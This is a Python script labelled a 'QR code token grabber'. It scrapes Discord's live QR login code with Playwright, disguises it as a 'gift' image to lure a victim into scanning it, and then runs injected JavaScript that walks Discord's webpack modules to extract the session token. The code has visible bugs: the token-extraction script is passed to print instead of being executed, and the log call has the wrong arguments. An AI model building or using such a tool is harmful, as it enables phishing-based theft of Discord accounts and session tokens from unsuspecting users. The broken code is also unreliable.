from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup
from PIL import Image
import cairosvg
import time
import os

path_overlay  = "temp/overlay.png"
path_template = "temp/template.png"

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    # os.system("mode 117,30")
    x = """                                              _____ __    __ __ __ __
                                             |  _  |  |  |  |  |  |  |   | QR CODE TOKEN GRABBER v1
                                             |     |  |__|_   _|-   -|   | DEVELOPER:  3xlxxs
                                             |__|__|_____| |_| |__|__|   | CREDITS TO: NightfallGT"""
    
    pipe = "_____________________________________________________________________________________________________________________"

    cls()
    print(x)
    print(pipe)
    print()

def log(msg):
    print(f"$ {msg}")


def add_logo(im2: Image.Image = Image.open(f'{path_overlay}')):
    im1 = Image.open('temp/qr_code.png', 'r')
    im1.paste(im2, (0, 0), im2)
    im1.save('temp/final_qr.png')

def add_qr():
    im1 = Image.open(f"{path_template}")
    im2 = Image.open("temp/final_qr.png")
    im1.paste(im2, (128,335,256,463))
    im1.save("gift.png")

def main():

    banner()
    
    with sync_playwright() as pw:
        browser = pw.firefox.launch(headless=False)
        page = browser.new_page()
        page.goto("https://discord.com/login")
        time.sleep(5)
        log('Page loaded')

        page_source = page.content()

        soup = BeautifulSoup(page_source, features='lxml')

        div = soup.find('div', {'class': 'qrCode_c6cd4b'})
        svgdata = str(div.find('svg'))

        cairosvg.svg2png(bytestring=svgdata, write_to="temp/qr_code.png")

        def custom_resize(image: Image.Image, new_width: int, new_height: int, trnsprnt: bool = False):
            original_width, original_height = image.size

            if trnsprnt:
                resized_image = Image.new('RGBA', (new_width, new_height), (0, 0, 0, 0))
            else:
                resized_image = Image.new('RGB', (new_width, new_height))

            for y in range(new_height):
                for x in range(new_width):
                    orig_x = int(x * original_width / new_width)
                    orig_y = int(y * original_height / new_height)

                    pixel = image.getpixel((orig_x, orig_y))

                    if trnsprnt and isinstance(pixel, tuple) and len(pixel) == 4:
                        alpha = pixel[3]
                        if alpha == 0:
                            continue

                    resized_image.putpixel((x, y), pixel)

            return resized_image

        discord_login = page.url


        png = Image.open("temp/qr_code.png")

        cropped = png.crop((0,0,37,37))

        resized = custom_resize(cropped, 128, 128)
        resized.save("temp/qr_code.png")

        add_logo()
        add_qr()

        log('QR Code has been generated. > gift.png')
        log('Waiting...')

        while True:
            if discord_login != page.url:
                log('Grabbing token...')
                token = print('''

        var req = webpackJsonp.push([
            [], {
                extra_id: (e, t, r) => e.exports = r
            },
            [
                ["extra_id"]
            ]
        ]);
        for (let e in req.c)
            if (req.c.hasOwnProperty(e)) {
                let t = req.c[e].exports;
                if (t && t.__esModule && t.default)
                    for (let e in t.default) "getToken" === e && (token = t.default.getToken())
            }
        return token;   
                    ''')
                log('Token grabbed:',token)
                browser.close()
                break


main()